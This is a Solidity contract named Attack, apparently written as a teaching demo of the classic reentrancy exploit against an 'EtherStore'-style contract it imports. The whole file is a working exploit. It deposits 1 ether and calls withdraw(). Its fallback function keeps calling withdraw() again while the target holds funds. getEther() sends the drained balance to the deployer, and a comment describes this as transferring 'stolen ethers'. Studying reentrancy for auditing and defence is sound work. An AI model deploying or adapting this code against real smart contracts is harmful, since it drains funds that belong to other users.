// 1. Deploys malicious contract with address of ReEntrancy(Our EtherStore) contract.

//SPDX-License-Identifier:MIT

import './ReEntrancy.sol';

pragma solidity ^0.8.0;

contract Attack{
    ReEntrancy public reentrancy;

    // Added owner state variable to get the wallet address for transfering stolen ethers from contract to owners wallet.
    // Assigning the value of owner address in constructor below.

    address payable owner; 

    constructor(address _reentrancyAddress) {
        reentrancy = ReEntrancy(_reentrancyAddress);
        owner = payable(msg.sender);
    } 

    // Fallback() which calls reentrancy contract withdraw() as soon it receives ether from withdraw() call.

    fallback() external payable{
        if(address(reentrancy).balance >=1 ether){
            reentrancy.withdraw();
        }
    }

    // getEther() to get all the ether from the contract address to owner wallet. ( Contract deployer )

    function getEther() external payable{
        owner.transfer(address(this).balance);
    }

    function attack() external payable{
        require(msg.value >= 1 ether);
        reentrancy.deposit{value:1 ether}();
        reentrancy.withdraw();
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}